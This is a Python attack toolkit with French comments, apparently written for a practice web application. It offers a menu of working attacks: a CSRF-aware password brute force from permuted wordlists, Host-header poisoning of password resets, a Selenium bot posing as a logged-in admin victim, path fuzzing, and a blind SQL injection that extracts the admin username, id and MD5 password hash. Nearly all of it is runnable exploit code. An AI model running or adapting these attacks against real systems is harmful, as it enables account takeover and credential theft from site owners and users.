import requests
from bs4 import BeautifulSoup
import itertools
import time
import re
from selenium import webdriver
from selenium.webdriver.common.by import By

# Variables globales (définies dynamiquement au lancement)
TARGET_IP = ""
TARGET_HOST = ""
WORDLIST = "dico.txt"

def afficher_banniere():
    banniere = """
    ████████╗  █████╗ ██╗     ██╗███████╗
    ╚══██╔══╝ ██╔══██╗██║     ██║██╔════╝
       ██║    ███████║██║     ██║███████╗
       ██║    ██╔══██║██║     ██║╚════██║
       ██║    ██║  ██║███████╗██║███████║
       ╚═╝    ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝
    """
    print(banniere)
    print("=" * 60 + "\n")

def get_csrf_token(session, target_url):
    response = session.get(target_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token_input = soup.find('input', {'name': 'csrf_token'})
    if token_input:
        return token_input['value']
    return None

def generate_wordlist(base_words):
    candidates = []
    for w in base_words:
        candidates.append(w)
        if w.capitalize() not in candidates:
            candidates.append(w.capitalize())

    generic_passwords = {"admin", "123456", "azerty", "motdepasse", "root"}
    osint_words = [w for w in base_words if w not in generic_passwords]

    for r in range(1, 5):
        for perm in itertools.permutations(osint_words, r):
            combined_text = "".join(perm)
            candidates.append(combined_text)
            candidates.append(combined_text.capitalize())
            
    return candidates

def brute_force(username):
    target_url = f"http://{TARGET_IP}/pages/login.php"
    
    print("\n" + "=" * 40)
    print(f"Cible ciblée      : {target_url}")
    print(f"Utilisateur visé  : {username}")
    print("=" * 40 + "\n")

    try:
        with open(WORDLIST, 'r', encoding='utf-8') as file:
            base_words = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("Impossible de continuer : le fichier dictionnaire est introuvable.")
        return

    passwords_to_test = generate_wordlist(base_words)
    total_mots = len(passwords_to_test)
    print(f"{total_mots} combinaisons chargées, l'attaque démarre...\n")

    with requests.Session() as session:
        compteur = 0
        for password in passwords_to_test:
            compteur += 1
            print(f"\rTentative {compteur}/{total_mots} en cours...", end="", flush=True)

            csrf_token = get_csrf_token(session, target_url)
            if not csrf_token:
                print("\nL'attaque s'arrête ici : impossible de récupérer le token CSRF.")
                break

            data = {
                'identifiant': username,
                'password': password,
                'csrf_token': csrf_token
            }

            response = session.post(target_url, data=data)

            if "Identifiants incorrects" not in response.text and "Erreur de sécurité" not in response.text:
                print(f"\n\nMot de passe trouvé pour {username} : {password}\n")
                break

def module_reset(email):
    url = f"http://{TARGET_IP}/pages/mot_de_passe_oublie.php"
    en_tetes = {"Host": TARGET_HOST}
    donnees = {"email_reset": email}
    
    print(f"\nEnvoi de la demande de réinitialisation pour : {email}")
    print(f"Host falsifié utilisé : {TARGET_HOST}")

    try:
        reponse = requests.post(url, headers=en_tetes, data=donnees)
        print("Demande envoyée. Il ne reste plus qu'à aller vérifier le fichier mail.txt sur le serveur.")
    except Exception as e:
        print(f"La requête n'a pas pu être envoyée : {e}")

def module_bot_admin():
    print("\nLancement du bot admin (Selenium)...")
    try:
        driver = webdriver.Chrome()
        driver.implicitly_wait(2)
        login_url = f"http://{TARGET_IP}/pages/login.php"
        driver.get(login_url)

        print("Saisie des identifiants admin...")
        username_input = driver.find_element(By.NAME, "identifiant")
        username_input.clear()
        username_input.send_keys("admin")

        password_input = driver.find_element(By.NAME, "password")
        password_input.clear()
        password_input.send_keys("Password123!")

        print("Connexion en cours...")
        bouton_submit = driver.find_element(By.CSS_SELECTOR, ".tab-btn.active")
        bouton_submit.click()
        time.sleep(1)

        if "login" not in driver.current_url:
            print("Le bot est connecté en tant qu'admin.")
            liens_deja_visites = []
            dashboard_url = f"http://{TARGET_IP}/pages/dashboard_admin.php"

            print("Scan du dashboard en cours (Ctrl+C pour arrêter)...")
            while True:
                driver.get(dashboard_url)
                time.sleep(2)
                texte_page = driver.find_element(By.TAG_NAME, "body").text

                # Adaptation de l'expression régulière avec l'IP dynamique
                ip_echappee = TARGET_IP.replace('.', r'\.')
                pattern = rf"(http://{ip_echappee}/pages/evaluer_distro\.php\?id=\S+)"
                liens_trouves = re.findall(pattern, texte_page)

                for url_trouvee in liens_trouves:
                    if url_trouvee not in liens_deja_visites:
                        print(f"Nouveau lien détecté : {url_trouvee}")
                        driver.get(url_trouvee)
                        print("Consultation de la page en cours.")
                        time.sleep(3)
                        liens_deja_visites.append(url_trouvee)
                        break

                time.sleep(10)
        else:
            print("La connexion a échoué.")
            driver.quit()
    except KeyboardInterrupt:
        print("\nArrêt du bot demandé par l'utilisateur.")
        try:
            driver.quit()
        except:
            pass
    except Exception as e:
        print(f"Une erreur Selenium est survenue : {e}")
        try:
            driver.quit()
        except:
            pass

def module_fuzzing():

    url = f"http://{TARGET_IP}/pages/FUZZ.php"

    wordlist = [
        "admin",
        "admin_backup",
        "backup",
        "administrator",
        "gestion",
        "gestionnaire",
        "users",
        "user",
        "profil",
        "administration",
        "private",
        "secret",
    ]

    session = requests.Session()

    results = []

    for word in wordlist:

        target = url.replace("FUZZ", word)

        try:
            response = session.get(
                target,
                timeout=5,
                allow_redirects=False
            )

            # On conserve uniquement les réponses intéressantes
            if response.status_code != 404:
                results.append(
                    (
                        word,
                        response.status_code,
                        len(response.content)
                    )
                )

        except requests.RequestException as e:
            print(f"Erreur sur {word} : {e}")
    # Affichage final
    print("\n" + "=" * 50)
    print("RESULTATS DU FUZZING")
    print("=" * 50)

    if results:

        for word, status, size in results:
            print(
                f"{word}.php trouvé "
                f"(code {status}, "
                f"{size} octets)"
            )

    else:
        print("Aucun résultat intéressant.")

    print("=" * 50)

def module_sqliblind():
    """
    Exploite l'injection SQL aveugle (blind, booléenne) sur admin_backup.php.
    Enchaîne : recherche du username admin -> son id_user -> son hash MD5.
    """
    import string

    target_url = f"http://{TARGET_IP}/pages/admin_backup.php"
    success_indicator = "L'utilisateur est déjà créé"

    def is_condition_true(sql_condition):
        payload = f"' OR ({sql_condition}) -- -"
        headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Python-Blind-Exploit"}
        response = requests.post(target_url, data={"username_check": payload}, headers=headers)
        return success_indicator in response.text

    print("\nÉtape 1 : recherche d'un nom d'utilisateur ayant le rôle 'admin'...")
    admin_user = ""
    charset = string.ascii_lowercase + string.digits + "_-"
    for pos in range(1, 25):
        found = False
        for char in charset:
            condition = f"SUBSTRING((SELECT username FROM utilisateurs WHERE role='admin' LIMIT 1), {pos}, 1) = '{char}'"
            if is_condition_true(condition):
                admin_user += char
                print(f"\rUsername en cours de reconstitution : {admin_user}", end="", flush=True)
                found = True
                break
        if not found:
            break

    if not admin_user:
        print("\nAucun username admin n'a pu être extrait.")
        return

    print(f"\nCompte admin identifié : '{admin_user}'\n")

    print(f"Étape 2 : extraction de l'id_user de '{admin_user}' (pour l'attaque IDOR)...")
    admin_id = ""
    digits = string.digits
    for pos in range(1, 10):
        found = False
        for d in digits:
            condition = f"SUBSTRING(CAST((SELECT id_user FROM utilisateurs WHERE username='{admin_user}') AS CHAR), {pos}, 1) = '{d}'"
            if is_condition_true(condition):
                admin_id += d
                print(f"\rID en cours de reconstitution : {admin_id}", end="", flush=True)
                found = True
                break
        if not found:
            break

    print(f"\nid_user de '{admin_user}' trouvé : {admin_id}\n")

    print(f"Étape 3 : extraction du hash MD5 du mot de passe de '{admin_user}'...")
    admin_hash = ""
    hex_charset = "0123456789abcdef"
    for pos in range(1, 33):
        found = False
        for char in hex_charset:
            condition = f"SUBSTRING((SELECT password FROM utilisateurs WHERE username='{admin_user}'), {pos}, 1) = '{char}'"
            if is_condition_true(condition):
                admin_hash += char
                print(f"\rHash en cours ({pos}/32) : {admin_hash}", end="", flush=True)
                found = True
                break
        if not found:
            break

    print(f"\nHash complet de '{admin_user}' : {admin_hash}\n")

def afficher_menu():
    print("\n" + "="*45)
    print("           MENU PRINCIPAL")
    print("="*45)
    print("1. Lancer l'attaque Brute Force")
    print("2. Lancer l'attaque Reset Mot de Passe")
    print("3. Lancer le Bot Admin (Simulateur Victime)")
    print("4. Fuzzing")
    print("5. sqliblind")
    print("6. Quitter")
    print("="*45)

def main():
    global TARGET_IP, TARGET_HOST
    
    afficher_banniere()
    
    TARGET_IP = input("Entrez l'adresse IP cible (ex: 10.0.2.2 ou 192.168.1.22) : ")
    TARGET_HOST = input("Entrez le Host pour le poisonning (ex: 10.0.2.15:8000) : ")

    while True:
        afficher_menu()
        choix = input("\nChoisis une option (1-6) : ")

        if choix == '1':
            user_cible = input("\nNom d'utilisateur à attaquer : ")
            brute_force(user_cible)

        elif choix == '2':
            email_cible = input("\nEmail de la victime (ex: hexalos@nexusdistro.local) : ")
            module_reset(email_cible)

        elif choix == '3':
            module_bot_admin()

        elif choix == '4':
            module_fuzzing()

        elif choix == '5':
            module_sqliblind()

        elif choix == '6':
            print("\nFermeture du programme.")
            break

        else:
            print("\nChoix invalide, entre un chiffre entre 1 et 6.")

if __name__ == "__main__":
    main()
